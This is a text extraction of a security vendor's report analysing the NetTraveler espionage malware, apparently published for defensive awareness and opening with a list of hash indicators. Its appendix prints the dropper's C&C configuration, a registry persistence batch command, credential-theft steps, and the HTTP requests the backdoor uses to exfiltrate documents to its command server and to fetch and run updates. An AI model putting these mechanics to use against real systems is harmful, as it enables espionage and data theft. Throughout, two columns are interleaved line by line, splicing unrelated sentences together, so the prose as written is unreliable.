+cb9cc50b18a7c91cf4a34c624b90db5d
+
+81591ae1c975b8a0b5ad5546a103992c
+
+cebaaad59f1616698dec4f14d76b4c9a
+
+81d92e20f3078bd8e43b226308393e43
+
+d04a7f30c83290b86cac8d762dcc2df5
+
+83429db9cc63196bf42c691cc09b7b84
+
+d218706eb07f2722ae4e0106cce27d52
+
+852f562812305ad099372109f8e8b189
+
+d286c4cdf40e2dae5362eff562bccd3a
+
+85865e048183849b255c92e609a5fa25
+
+d2fe88fff648a0bcbfdf0f0bd042a0a4
+
+86cce64193a347b50329a32cdf08d198
+
+d354b71116961cad955ed11cb938ca32
+
+89bfd463ca76b62c61a548778316567d
+
+d687cfde1c4ea77de1b92ea2f9e90ad5
+
+8ccea94fd83d9cb1b15a2a4befec24a2
+
+d80c29813bfbc3cbcbd469249d49ebf3
+
+8d3036a65ac2404d4562cdb927fd3d2c
+
+d9c0ca95e49b113c5751fffdb20beb3f
+
+8d78a9e3df1e19f9520f2bbb5f04cb54
+
+d9cf41b5d11e42dabf9470964d09c000
+
+8dc61b737990385473dca9bfc826727b
+
+db6e36f962fdb58c8e9f8f9a781fda66
+
+95113e04af14c23df607964fa9d83476
+
+dc01df3c40cb4fb0bef448693475ea1b
+
+9b198f1e260700bdcb4740266cd35b3f
+
+def612ad0554006378f185d3b56efb57
+
+9c1c2825532b25e266d62db50952ab44
+
+e51a4cc0272a98e9eddfec16667603f4
+
+9c544da8c23826379d60581cce17a483
+
+e5b1ffd2ecd7e610d07d093d65639da9
+
+a0e350787e4134ea91ccb26d17cdf167
+
+eb5761c410b5139f23235e9b67964495
+
+a1169fb2eb93616ced7536a53fb05648
+
+eefc66a1e978dc9d825f28702106d4d5
+
+a431d5786d9d95bc9d04df07cbefc0a2
+
+efa23860086c5d12d3e6b918073c717f
+
+a6d89df2a80675980fb3e4a9bcc162e2
+
+f3c5c20f5c45fc401484caf72753d778
+
+a77456a160890a26a8f7c019c2e77021
+
+fad8f37c9bd5420f49cfd5960a60fa24
+
+aa6f8eff83aea3ff7b8f016e67f74dac
+
+fb3495715764cdaa547f2b040c0a9b1f
+
+af6649323daf6dbd3aef1b950588487c
+
+fc3853c2383e2fbb2af381fd1277504d
+
+b3840ec1299517dacd6c18c71ff5bafc
+
+fe16c30782e2b16b07d5a3a1cf9dfb8f
+
+b8c99bc028a0a32288d858df7bf6bec1
+
+ff04126a5d61a10c81bfd0a6d0a643d0
+
+24
+
+The NeTTravelerconclusions
+
+coNclu SioNS:
+
+during our analysis, we describe nettraveler, a 
+
+by publishing this report we would like to raise 
+
+malicious data exfiltration tool used by a me-
+
+awareness of all organizations and individuals 
+
+dium-sized threat actor group from china. the 
+
+who might become a victim of these attackers. 
+
+main targets of the group include government 
+
+We would like to encourage people of all coun-
+
+institutions, embassies, oil and gas industry, 
+
+tries to learn something from this report, check 
+
+research institutes, universities, private com-
+
+their systems and be prepared for potential fu-
+
+panies, military contractors and activists. the 
+
+ture cyberattacks against them.
+
+group’s domains of interest include space ex-
+
+ploration, nanotechnology, energy production, 
+
+more information on attribution and victims will 
+
+nuclear power, lasers, medicine and communi-
+
+be available to selected parties, including lo-
+
+cations between others.
+
+cal authorities of victim countries. For details, 
+
+please contact us at intelreports@kaspersky.
+
+Although not very advanced, the netttraveler 
+
+com.
+
+attackers have successfully compromised hun-
+
+dreds of targets around the world, with the high-
+
+est number in mongolia, india and russia.
+
+the group using nettraveler is also employing 
+
+other malware, including Zegost, saker and oth-
+
+ers. to compromise their victims, they rely on 
+
+exploits for two popular vulnerabilities in mic-
+
+rosoft office.
+
+based on collected intelligence, we estimate the 
+
+group size to about 50 individuals, most of which 
+
+speak chinese natively and has knowledge of 
+
+english language.
+
+ 25
+
+ appe NDix a: 
+
+malWare Tech Nical aNalySiS
+
+the net traveler dro PPer
+
+mD5
+
+ 2a43c23a17cd2bc9074a486c47444e7c
+
+create date (GmT)
+
+ 2013.02.18 07:54:28
+
+Size
+
+ 176’640
+
+linker version
+
+ 6.0 (msVc++ 6.0)
+
+descriP tion
+
+technicAl d e tAils
+
+the module is a Win32 Pe executable file com-
+
+execution of the module starts with the creation 
+
+piled in microsoft Visual c++ 6.0. its main pur-
+
+of a system mutex object called “instAll ser-
+
+pose is to drop a dll file and register it as a sys-
+
+Vices noW!”. if this mutex already exists the 
+
+tem service. the malware looks up a suitable 
+
+module quits to avoid duplicate instances of the 
+
+service name from one of the values in the reg-
+
+same module from running.
+
+istry.
+
+ this module also drops an ini-type file with the 
+
+tion file named %Windir%\system\config_t.dat 
+
+configuration that is later used by the nettrav-
+
+which is populated with the strings embedded in 
+
+eler backdoor.
+
+the body of the executable and encrypted with 
+
+ After that, the module creates the configura-
+
+simple one-byte xor (0x3e).
+
+encrypted configuration data in the dropper
+
+26
+
+The NeTTravelerAPPendix A: mAlWAre technicAl AnAlysis
+
+the config_t.dat is an ini-type file which contains 
+
+the purpose of Ps, PP, Pu, PW, PF parameters 
+
+the module configuration shown below:
+
+is the following:
+
+[Option]
+
+ >  Ps = proxy server address
+
+ > PP = proxy server port
+
+WebPage=hXXp://vip222idc.s169.288idc.com/nt12/
+
+ > Pu = proxy username
+
+newyork/city/nettraveler.asp2
+
+ > PW = proxy password
+
+DownCmdTime=10
+
+UploadRate=128
+
+[Other]
+
+UP=0
+
+[OtherTwo]
+
+AutoCheck=1
+
+ > PF parameter purpose remains unclear.
+
+the  module  then  queries  registry  value  at 
+
+hklm\SofTWare\microsoft\Windows 
+
+NT\\currentversion\Svchost\netsvcs which 
+
+is a multi-string type of value. then it iterates 
+
+through the names of services in that value to 
+
+the WebPage parameter’s maximum length is 
+
+find a special service name. it must not be the 
+
+128 bytes and represents a url for the com-
+
+“6to4” service and there must not be registry 
+
+mand and control server (c&c). downcmdtime 
+
+key hklm\SySTem\currentcontrolSet\Ser-
+
+is the delay in minutes between requests sent 
+
+vices\<servicename>.
+
+to the c&c server.
+
+on Windows xP services that match the de-
+
+the code of the function to dump the ini file 
+
+scribed criterias are (eg.) “ias”,”iprip”, “irmon” 
+
+is designed to process several cases. there is 
+
+and a few others. these names are different on 
+
+1 byte value for variable uP (which stands for 
+
+other Windows os and even depend on installed 
+
+“use Proxy”) from section [other]. if that value 
+
+features or service Packs. the malware takes 
+
+is set to 1 (absolute file offset 0x334) then the 
+
+the first matching service name and uses it.
+
+ini file section [other] will be populated with the 
+
+following values:
+
+right after that, the malware attempts to delete 
+
+[Other]
+
+UP=1
+
+%WiNDir %\system32\<servicename>ex.
+
+dll and registers a new system service with the 
+
+same name <servicename>. the service is 
+
+PS=<string (max 32 bytes from offset 0x335)>
+
+designed to be a Win32 shared process like 
+
+PP=<integer (2 bytes and positive from offset 0x355)>
+
+svchost, autostarted by system service control 
+
+PU=<string (max 32 bytes from offset 0x357)>
+
+manager during system boot. that creates cor-
+
+PW=<string (max 32 bytes from offset 0x377)>
+
+responding system registry values in hklm\
+
+PF=<integer (2 bytes and non-negative from offset 
+
+SySTem\currentcontrolSet\Services\<ser-
+
+0x397)>
+
+vicename>.
+
+ 27
+
+ 
+ 
+After that it saves to local directory and executes 
+
+the malware is Win32 Pe dll file compiled in mi-
+
+the following batch file (net.bat):
+
+crosoft Visual c++ 6.0. it has one export function 
+
+servicemain which has the main functionality of 
+
+descriP tion
+
+@echo off
+
+the module.
+
+@reg  add  “hkey_local_machiNe\SyS-
+
+Tem\currentcontrolSet\Services\irmon\
+
+ this module has initial filename assigned during 
+
+parameters” /v ServiceDll /t reG_expaND_
+
+compilation: “dll.dll”.
+
+SZ /d c:\WiNDoWS\system32\<servicen-
+
+ame>ex.dll
+
+note that <servicename> is replaced with the 
+
+upon start the module sets corresponding ser-
+
+actual system service name that was previously 
+
+vice status to “start_Pending” and then imme-
+
+found.
+
+diately to “running”.
+
+technicAl d e tAils
+
+After  that  the  module  creates  the  c:\WiN-
+
+ it checks if system mutex named “NetTravler is 
+
+DoWS\system32\<servicename>ex.dll file 
+
+running!” exists and terminates if that is true. 
+
+on disk and sets hard-coded file creation and 
+
+note: other known mutexes used by variants of 
+
+last access date and time to “20:00 17 august 
+
+nettraveler include:
+
+2004”.
+
+the new file is then filled with data produced 
+
+ > dochunter2012 is running!
+
+after decryption of the hard-coded data block.
+
+ > hunter-2012 is running!
+
+ > boat-12 is running!
+
+ > nt-2012 is running!
+
+ > nettravler is running!
+
+ > nettravler2012 is running!
+
+ > sh-2011 is running!
+
+ > shenghai is running!
+
+After that it opens %WiNDir%\system\con-
+
+fig_t.dat file and parses the following values:
+
+net traveler b acKdoor 
+(droPPed file)
+
+mD5
+
+create date 
+(GmT)
+
+3c0ea91ea42f2bf6686e 
+9735998e406e
+
+2013.02.18 02:33:49
+
+Size
+
+204’800
+
+linker version
+
+6.0 (msVc++ 6.0)
+
+28
+
+The NeTTraveler 
+ 
+APPendix A: mAlWAre technicAl AnAlysis
+
+Option]
+
+WebPage
+
+DownCmdTime
+
+UploadRate
+
+[OtherTwo]
+
+AutoCheck
+
+CheckedSuccess
+
+ > pS (string with no default value, max 64 
+
+chars)
+
+ > pp (integer with default value: 80)
+
+ > pu (string with no default value, max 32 
+
+chars)
+
+ > pW (string with no default value, max 32 
+
+chars)
+
+ > pf (integer with default value: 10)
+
+it creates a list of local paths in memory to work 
+
+with later:
+
+next the module prepares some strings for test-
+
+ > %sysdir%\stat_t.ini
+
+ > %sysdir%\dnlist.ini
+
+ > %sysdir%\enumfs.ini
+
+ > %sysdir%\uenumfs.ini
+
+ > %sysdir%\udidx.ini
+
+ >  %temP%\ntvba00.tmp\
+
+ing the internet connection:
+
+<modulename>.log
+
+http://www.microsoft.com/info/privacy_se-
+
+curity.htm (%testurl%)
+
+if checkedSuccess value from ini file equals 0 or 
+
+ironically, the %testurl% is a microsoft web 
+
+doesn’t exist, the module will fetch additional con-
+
+page about privacy, security and safety online 
+
+figuration from the same ini file [other] section:
+
+(last updated in January 2000):
+
+ 29
+
+ 
+ 
+After that with the help of Wininet APi the mod-
+
+User: <proxy username>
+
+ule issues an httP Get request to %testurl% 
+
+Pass: <proxy password>
+
+(see above) and the following hardcoded httP 
+
+<data from the URL>
+
+header values:
+
+///////////////////////////////////////////////
+
+accept: image/gif, image/x-xbitmap, image/
+
+jpeg,  image/pjpeg,  application/x-shock-
+
+ if the Ps, PP, Pu, PW parameters were not found 
+
+wave-flash, */*
+
+accept-language: en-us
+
+the ini file or Autocheck value is set to 1, the 
+
+module attempts to find local proxy settings ac-
+
+proxy-connection: keep-alive
+
+cording to the procedure below.
+
+pragma: no-cache
+
+user-agent: mozilla/4.0 (compatible; mSie 
+
+6.0)
+
+it sets other options such as proxy server ad-
+
+dress and port (Ps and PP values from ini file 
+
+or attempts to find proxy settings automatical-
+
+finding Proxy 
+configuration
+
+ly), proxy username and password (Pu and PW 
+
+ First, the module lists contents of %ProGrAm-
+
+values from the ini file), several connection 
+
+Files% directory and appends the listing to the 
+
+timeouts limited with 60 seconds.
+
+log file.
+
+the module submits the request and reads the 
+
+ then it opens ie history file of the current user 
+
+response of the server. the response is stored 
+
+(history.ie5\index.dat) parses it and appends 
+
+in newly allocated memory block.
+
+the log with discovered logins/password saved 
+
+After that the malware appends debug output 
+
+to the log file named <modulename>.log. the 
+
+ After that the module logs current version of 
+
+output messages are shown below:
+
+internet explorer. interestingly that the log file is 
+
+in the the history file as a part of visited urls.
+
+appended with the following hard coded string:
+
+“ie版本: internet explorer “, 版本 means “ver-
+
+sion” in simplified chinese.
+
+method currect:
+
+User: <current user name>
+
+ProxyIP::
+
+ProxyBypass::
+
+30
+
+The NeTTraveler 
+APPendix A: mAlWAre technicAl AnAlysis
+
+the module reads ie version from hKlm\soft-
+
+function (method 2) was probably merged with 
+
+ware\microsoft\internet explorer\Version reg-
+
+another one (method 3) in newer variant of the 
+
+istry value.
+
+malware.
+
+then it gets version of current os, and again 
+
+appends the result to the log file with some hard 
+
+me thod 1:
+
+coded strings in it:
+
+this is a straightforward attempt to connect to 
+
+the test url, assuming that system-wide proxy 
+
+“操作系统版本” which means “version of oper-
+
+settings are correct or no proxy is required to 
+
+ating system” in simplified chinese.
+
+access the external website. the url for testing 
+
+is http://www.microsoft.com/info/privacy_
+
+the malware is capable of interpretation of sys-
+
+security.htm with the following header values:
+
+tem minor/major code and recognizing the fol-
+
+lowing o ses:
+
+accept: image/gif, image/x-xbitmap, image/
+
+ > microsoft Windows 95
+
+jpeg,  image/pjpeg,  application/x-shock-
+
+ > microsoft Windows 95 osr
+
+wave-flash, */*
+
+ > microsoft Windows 98
+
+ > microsoft Windows 98 se
+
+accept-language: en-us
+
+proxy-connection: keep-alive
+
+ > microsoft Windows millennium edition
+
+pragma: no-cache
+
+ > microsoft Windows nt
+
+ > microsoft Windows 2000
+
+ > microsoft Windows xP
+
+ > microsoft Windows 2003
+
+ > microsoft Windows Vista
+
+ > microsoft Windows 7
+
+if the method succeeds the module appends 
+
+received data from the url to the log file and 
+
+corresponding parameter is set in the ini file 
+
+(uP=0).
+
+if something fails the following message is ap-
+
+it can also recognize type of os: Professional, 
+
+pended to the log file: “method1 fail!!!!!”
+
+server, Advanced server and exact version and 
+
+build numbers are also appended to the log file.
+
+there were four different methods to find proxy 
+
+this method is used when the infected machine 
+
+configuration on the system according to the log 
+
+uses proxy server but the settings are not avail-
+
+file messages set in three functions. one of the 
+
+able for local system user. A user working at 
+
+me thod 2 And me thod 3:
+
+ 31
+
+ 
+ 
+the infected machine might have internet ac-
+
+user secrets via credenumerateA and looks for 
+
+cess and should have the required proxy server 
+
+those which start with “microsoft_Wininet_” and 
+
+settings.
+
+contain the address of the proxy server previ-
+
+ously obtained. these secrets are decrypted 
+
+the malware list all processes running on the 
+
+with cryptunprotectdata APi call. such call is 
+
+machine and locates process named “exPlor-
+
+possible only after impersonation as local user 
+
+er.exe”. this process is a system shell which is 
+
+which is available for the malware running with 
+
+normally running after local user successfully 
+
+local system privileges. this method checks the 
+
+authenticates and logs in to the system. the 
+
+first available password in the list of passwords 
+
+malware finds explorer process and obtains se-
+
+from the system stored secrets.
+
+curity token which is later used to temporarily 
+
+impersonate as local user and get proxy con-
+
+once the potential server, port, login and pass-
+
+figuration with internetQueryoptionA(0,inter-
+
+word are obtained the malware makes a test 
+
+net_oPtion_Proxy,...) APi call.
+
+query to the same url: http://www.microsoft.
+
+com/info/privacy_security.htm. if it succeeds 
+
+if the result contains proxy settings the malware 
+
+the content of this page is appended to the log 
+
+gets them. if for some reason local proxy set-
+
+file with all details about the proxy server. if the 
+
+tings were not found in current user profile, the 
+
+method fails it prints the following line in the log 
+
+malware attempts to double-check and opens 
+
+file: “method3 fail!!!!!”
+
+ie settings in the registry. the following registry 
+
+values are checked:
+
+hkcu\Software\microsoft\Windows\cur-
+
+this method is identical to method 3 with just 
+
+rentversion\internet Settings\proxyenable
+
+one difference: it checks the last available pass-
+
+hkcu\Software\microsoft\Windows\cur-
+
+word in the list of passwords from the system 
+
+rentversion\internet Settings\proxyServer
+
+stored secrets.
+
+me thod 4:
+
+hkcu\Software\microsoft\Windows\cur-
+
+rentversion\internet Settings\proxyover-
+
+ride
+
+me thod x (debuG ):
+
+there is also an unused method in the code with 
+
+no internal number, which was most likely used 
+
+After that the malware first obtains the ie stored 
+
+to debug the application as it writes all interme-
+
+credentials. it iterates through all stored local 
+
+diate results to the log file, starting from string 
+
+32
+
+The NeTTravelerAPPendix A: mAlWAre technicAl AnAlysis
+
+“Get from ieoption!” or “Get from reg!” de-
+
+pending on the path of code execution.
+
+thre Ad1 (commA nd A nd c ontrol 
+thre Ad)
+
+this thread starts from collecting local system 
+
+if the malware failed to locate the proxy server it 
+
+information, including the following:
+
+unregisters current malicious service by deleting 
+
+ > local computer name
+
+corresponding registry keys in hklm\System\
+
+ > local iP address
+
+currentcontrolSet\<servicename>\ and at-
+
+ > local user name
+
+tempts to delete all related files from the fol-
+
+ > os version, build and product type
+
+lowing list:
+
+ > list of local disk drives with available 
+
+space on them
+
+ > c:\Windows\system32\enumfs.ini
+
+ > cPu  characteristics  including  vendor 
+
+ > c:\Windows\system32\uenumfs.ini
+
+identifier and frequency
+
+ > c:\Windows\system32\udidx.ini
+
+ > rAm status
+
+ > c:\Windows\system32\dnlist.ini
+
+ > current process lists
+
+ > c:\Windows\system32\stat_t.ini
+
+ > output  of  the  “ipconfig  /all”  system 
+
+command
+
+otherwise, if the proxy was checked successful-
+
+this information is stored in a text buffer with 
+
+ly the malware writes the following value to the 
+
+chinese comments like shown below (transla-
+
+config file (config_t.dat):
+
+tion is added in red):
+
+[OtherTwo]
+
+CheckedSuccess=1
+
+[计算机信息] computer information
+
+计算机: <local hostname> computer
+
+用户名: <local username> user name
+
+ip地址: <local iP> Address
+
+After that the module sleeps for 60 seconds and 
+
+操作系统: <os> <service Pack> (<build num-
+
+starts a new thread (see below thread1), sleeps 
+
+ber>) operating system 
+
+10 more seconds and creates another thread 
+
+(see below thread2). right after that it enters an 
+
+磁盘空间: 总磁盘空间为:***Gb,剩余磁盘空间
+
+infinite loop of doing nothing but sleeping which 
+
+为***Gb(占**.**%)
+
+can be interrupted by a special value in global 
+
+disk space: total disk space ***Gb, the remain-
+
+variable set by other threads. upon detecting 
+
+ing disk space ***Gb (**.**%)
+
+this value the service routine ends which termi-
+
+cPu: <cPu type> <cPu Frequency>mhZ
+
+nates the service execution.
+
+物理内存: 总物理内存:***mb,可用内存:***mb (
+
+占**.**%)
+
+ 33
+
+ 
+ 
+ 
+Physical memory: total physical memory: ***mb 
+
+Host: vip222idc.s169.288idc.com
+
+of available memory: ***mb (**.**%)
+
+Connection: Keep-Alive
+
+[进程列表] Process list
+
+0 [system Process]
+
+4 system
+
+892 smss.exe
+
+948 csrss.exe
+
+972 winlogon.exe
+
+1016 services.exe
+
+1028 lsass.exe
+
+…
+
+if the file upload is successful, the module de-
+
+letes the “system_t.dll” file. Please note that 
+
+the serial number of current disk drive (most 
+
+likely it is drive “c”) is used in httP query value 
+
+hostid. this identifier derived from the local 
+
+filesystem is used later as a reliable identifier of 
+
+current infected machine or simply botid.
+
+the c ontrol l ooP
+
+c&c c ommunicAtion
+
+After that it enters control loop. every 10 minutes 
+
+this information is saved in %WiNDir%\Sys 
+
+according to the downcmdtime parameter val-
+
+tem32\system_t.dll text file. this file is read 
+
+ue in the config file, it sends httP Get request 
+
+a moment later, compressed using a custom 
+
+of the following format:
+
+lempel-Ziv-based algorithm, encoded with a 
+
+modified base64 encoding and uploaded to the 
+
+GET  /nt12/new york /cit y/nettraveler.asp?ac 
+
+c&c server using httP Get request of the fol-
+
+tion=getcmd&hostid=<DriveCSerialNumber>&host 
+
+lowing format:
+
+name=<Hostname>
+
+…
+
+GET  /nt12/newyork/city/nettraveler.asp?host 
+
+if the server response starts with “[cmdbegin]” 
+
+id=<DriveCSerialNumber>&hostname=<Host 
+
+and ends with “[cmdend]” then the response 
+
+name>&hostip=<Host IP>&filename=travlerback 
+
+is saved in c:\Windows\System32\stat_t.
+
+info-<Current date and time>.dll&filestart=0&file 
+
+ini file. After that the code confirms receiving 
+
+text=begin::<modified Base64 and LZ-compressed  
+
+the command by submitting another httP Get 
+
+data>::end
+
+request in the format below:
+
+Accept: image/gif, image/x-xbitmap, image/jpeg, 
+
+image/pjpeg, application/x-shockwave-flash, */*
+
+GET  /nt12/newyork/city/nettraveler.asp?action= 
+
+Accept-Language: en-us
+
+Pragma: no-cache
+
+gotcmd&hostid=<DriveCSerialNumber>&hostname 
+
+=<Hostname>
+
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win 
+
+…
+
+dows NT 5.0)
+
+34
+
+The NeTTraveler 
+APPendix A: mAlWAre technicAl AnAlysis
+
+the module expects server to reply “success”. if 
+
+All values f<number> from stat_t.ini file are read and 
+
+it doesn’t the module will try again in 10 minutes.
+
+saved in %WINDIR%\System32\dnlist.ini file:
+
+if the server was notified and confirmed receiv-
+
+f1=<string>
+
+ing the notification, the module reads stat_t.
+
+f2=<string>
+
+ini file which is just another config in ini format:
+
+f3=<string>
+
+[Filelist]
+
+…
+
+[Download]
+
+dircount=<integer, default 0>
+
+filecount=<integer, default 0>
+
+f1=<string>
+
+f2=<string>
+
+f3=<string>
+
+…
+
+d1=<string>
+
+d2=<string>
+
+d3=<string>
+
+…
+
+[Scan]
+
+All values d<number> from stat_t.ini file are read 
+
+and the corresponding local directory and sub-
+
+directories listings are collected and appended 
+
+to the dnlist.ini file in the format:
+
+[Filelist]
+
+f1=<string>
+
+f2=<string>
+
+f3=<string>
+
+…
+
+dircount=<integer, default 0>
+
+filecount=<integer, default 0>
+
+the following values from stat_t.ini file are also 
+
+transferred to the dnlist.ini file:
+
+section 
+in stat_t.ini
+
+ value 
+in stat_t.ini
+
+ default
+
+ section 
+ in dnlist.ini
+
+ value 
+ in dnlist.ini
+
+ [scan]
+
+ [scan]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ dircount
+
+ scanAll
+
+ typelimit
+
+ usearch
+
+ Gsearch
+
+ utypelimit
+
+ uAuto
+
+ types
+
+False
+
+true
+
+true
+
+true
+
+true
+
+False
+
+doc, docx, xls, 
+xlsx, txt, rtf, pdf
+
+[scanlist]
+
+ [scanlist]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ dircount
+
+ scanAll
+
+ typelimit
+
+ usearch
+
+ Gsearch
+
+ utypelimit
+
+ uAuto
+
+ types
+
+ 35
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ [other]
+
+ uP
+
+ Ps
+
+ PP
+
+ Pu
+
+ PW
+
+ PF
+
+False
+
+80
+
+ 10
+
+ [other]
+
+[other]
+
+ [other]
+
+ [other]
+
+[other]
+
+ [other]
+
+ 0 or 1
+
+ Ps
+
+ PP
+
+ Pu
+
+ PW
+
+ PF
+
+this is clearly the functionality which lets the 
+
+f<M>=<string>
+
+attacker download specific files or even full di-
+
+d1=<string>
+
+rectories including all subdirectories contents 
+
+d2=<string>
+
+basing on defined file search criterias, such as 
+
+…
+
+file extensions.
+
+Filesystem s cAn
+
+d<K>=<string>
+
+dircount=<K>
+
+filecount=<M>
+
+[<d2 string>]
+
+the malware has a file enumeration routine, 
+
+…
+
+which gets the settings from dnlist.ini (such as 
+
+directory paths to process) and launches a re-
+
+After execution, this log file contains directories 
+
+cursive directory search. the output is saved to 
+
+with all filenames and subdirectories. only di-
+
+enumfs.ini file in the following format:
+
+rectory/file names are stored, with no addition-
+
+[Computer]
+
+al data such as timestamps or size. When the 
+
+search is finished, the module saves current 
+
+Name=<Local system name>
+
+date to the dnlist.ini file and changes option 
+
+Page=<Current Windows ANSI code page (ACP)>
+
+scanAll, see format below. this is done to avoid 
+
+[<Local system name>]
+
+recurrent scanning of the filesystem, which is 
+
+d1=<string>
+
+d2=<string>
+
+…
+
+d<N>=<string>
+
+dircount=<N>
+
+[<d1 string>]
+
+f1=<string>
+
+f2=<string>
+
+…
+
+36
+
+normally a heavy process and might be noticed 
+
+by local user or an administrator.
+
+[EnumTime]
+
+DateTime=<YYYY-MM-DD date>
+
+[ScanList]
+
+ScanAll=False
+
+The NeTTraveler 
+APPendix A: mAlWAre technicAl AnAlysis
+
+After scanning the local filesystem, enumfs.
+
+if the file matches the criterias, then a unique 
+
+ini file is uploaded to the server via httP Get 
+
+file  state  identifier  for  that  file  is  created, 
+
+request described above (see the submission 
+
+which is an md5 hash of the following string: 
+
+process of stat_t.ini file in the beginning of c&c 
+
+“<filename>  <year>-<month>-<Day> 
+
+communication part) with filename of the fol-
+
+<h our>:<m inute>:<Second>:<m illisec-
+
+lowing format:
+
+onds>”. the date and time values in the string 
+
+before are obtained from the file last change 
+
+filelist-<month><Day>-<hour><minute> 
+
+time.
+
+<Second>.ini
+
+After that the module creates a name used for 
+
+uploading the file to the server, which consists 
+
+uPloAdinG Files
+
+of  the  following:  “<year>-<month>-<Day>-
+
+the next stage of this thread uploads files inter-
+
+<hour>-<minute>-<file state identifier, the 
+
+esting for the attacker to the c&c server. this 
+
+mD5>”. the time and date values are also taken 
+
+process is described below.
+
+from the file’s last change time. this file is up-
+
+loaded to the c&c using the same procedure as 
+
+the module works with files described in dnlist.
+
+used before for uploading other files.
+
+ini file. it gets a list of file extensions that must 
+
+be uploaded to the c&c first. there is a default 
+
+After that, thread1 attempts to upload a file called 
+
+list of extensions (value Types of section [oth-
+
+uenumfs.ini, which is created by the thread2. the 
+
+er]) that represent interest for the attackers: 
+
+remote filename is set to the following “ufilel-
+
+doc,docx,xls,xlsx,txt,rtf,pdf. then it gets file-
+
+ist-<month><Day>-<hour><minute><Sec-
+
+total values from [filelist] section of dnlist.ini 
+
+ond>.ini”.
+
+and iterates through every f<N> value, where n 
+
+is a positive integer starting from 1.
+
+next, the thread iterates through %Temp%\
+
+there are several tests applied to each file, be-
+
+located there. the file names are preserved as 
+
+ntvba00.tmp\ directory and uploads every file 
+
+fore it is uploaded to the server, including the 
+
+they are.
+
+following:
+
+ > File size must not be larger than ~10mb 
+
+control Procedure
+
+(10’485’760 bytes).
+
+then, the thread issues a special httP Get re-
+
+ > File must have one of the extensions from 
+
+quest to get next control instruction from the 
+
+the “types” option.
+
+c&c. this is done by accessing the following uri:
+
+ 37
+
+hXXp://vip222idc.s169.288idc.com/nt12/newyork/
+
+ > %sysdir%\enumfs.ini
+
+city/nettraveler.asp?action=getdata (3)
+
+ > %sysdir%\dnlist.ini
+
+ > %sysdir%\udidx.ini
+
+server response is converted to uppercase and 
+
+ > %sysdir%\uenumfs.ini
+
+analyzed. there is defined set of responses ex-
+
+ > %sysdir%\stat_t.ini
+
+pected from the c&c server:
+
+01. <botid>:uninstAll
+
+04. <botid>:uPloAd
+
+this command simply uninstalls the malicious 
+
+this procedure is identical to the uPdAte com-
+
+service from the registry and deletes locally cre-
+
+mand described before with one difference - no 
+
+ated files.
+
+uninstallation of the current module is done, only 
+
+new executable is downloaded and started. this 
+
+02. <botid>:uPdAte
+
+method is probably used to execute additional 
+
+independent malicious executable, unrelated 
+
+this procedure starts from uninstalling current 
+
+to the original nettraveler malware. or it can 
+
+service, then it issues three httP Get requests 
+
+be used to infect with the nettraveler backdoor 
+
+to the c&c script url:
+
+configured for some other c&c server.
+
+GET .../newyork/city/nettraveler.asp?action=data-
+
+After processing any of the commands above 
+
+size to get the size of updated module that will 
+
+the malware issues the following request to the 
+
+be pushed with next request.
+
+server to confirm command execution:
+
+GET .../newyork/city/../updata.exe to get the up-
+
+GET .../newyork/city/nettraveler.asp?action=updat-
+
+dated module to be executed. this module is 
+
+ed&hostid=<BotId>
+
+instantly saved to %Windir%\install.exe and 
+
+executed.
+
+03. <botid>:reset
+
+if the server hasn’t issued the uninstAll com-
+
+mand the thread continues execution starting 
+
+from the beginning of the control loop (see 
+
+above).
+
+this procedure simply removes all temporary 
+
+files, such as the following:
+
+38
+
+The NeTTravelerAPPendix A: mAlWAre technicAl AnAlysis
+
+thre Ad2 (driVe m onitorinG t hre Ad)
+
+this thread creates a hidden window with class 
+
+uenumfs.ini file for writing. the latter is filled 
+
+name “NTmainWndclass” and processes win-
+
+with directories and subdirectories listings of the 
+
+dow messages in a loop until it is interrupted by 
+
+attached disk drive. the format of the data in 
+
+special variable value. the window procedure 
+
+uenumfs.ini is almost identical to the one created 
+
+processes only one window message, Wm_De-
+
+during fixed drive filesystem scan (see “Filesys-
+
+vicechaNGe with wParam value set to DbT_
+
+tem scan” part in thread1 description above).
+
+Devicearrival, which is sent by the system 
+
+when a new removable device such as usb flash 
+
+in addition to that, the same criterias are applied 
+
+drive or network shared folder is attached to 
+
+to each file (size and file extension) as in fixed 
+
+the system.
+
+drive filesystem scan. Also, every file gets a state 
+
+id calculated as md5 hash of the filename and 
+
+the module will proceed only if the attached 
+
+timestamp of the last modification. this hash 
+
+removable device has provided a disk volume. 
+
+is used to generate a new filepath in the follow-
+
+it is designed to have different procedures for 
+
+ing format: %Temp%\ntvba00.tmp\<year>-
+
+removable disk drives from usb flash and net-
+
+<month>-<Day>-<hour>-<minute>-<file 
+
+work shares.
+
+state id, mD5 hexadecimal string>.<original 
+
+extension>. the source file from newly attached 
+
+the usb drives will be processed only if GSearch 
+
+drive is then copied to the destination set by the 
+
+value is set to true in [other] section of dnlist.
+
+generated file path. Please note, that the file orig-
+
+ini file. similarly, a new network drive will be 
+
+inal extension is preserved, while the file name is 
+
+processed only if uSearch value is set to true 
+
+changed. that is used to prevent further problems 
+
+in [other] section of dnlist.ini file.
+
+when working with unsupported encoding.
+
+both network and removable usb drives are 
+
+At the same time when file is copied to ntvba00.
+
+processed in the same procedure, which reads 
+
+tmp directory, a record is added to udxidx.ini 
+
+the following values from dnlist.ini file:
+
+file, which has the following format:
+
+[Other]
+
+[Index]
+
+UTypeLimit=<boolean, default True>
+
+<File state id, MD5 hexadecimal string>=1
+
+UAuto=<boolean, default False>
+
+if uAuto option is set to true, the thread creates 
+
+ready copied before, unless they were changed 
+
+%Temp%\ntvba00.tmp\ directory and opens 
+
+by the user.
+
+this is done to avoid copying files that were al-
+
+ 39
+
+ 
+to avoid excessive use of the disk drive and oc-
+
+a string with call to the “sprintf’ function and 
+
+casional interest of the local user, the file copy-
+
+“%8x” parameter which outputs 8 characters 
+
+ing procedure has a delay. every 1000 files the 
+
+representing a number in hexadecimal form. 
+
+thread delays execution and sleeps for 9 sec-
+
+despite the fact that the output of this call is in 
+
+onds.
+
+uppercase, the author of the module converts 
+
+the output to uppercase characters again. this 
+
+could be due to the fact that the author used to 
+
+side notes
+
+have “%8x” format string before, which made 
+
+useless text transformation
+
+such conversion rational. however, that clearly 
+
+in function which gets disk volume serial num-
+
+shows that the developer wasn’t aware of vari-
+
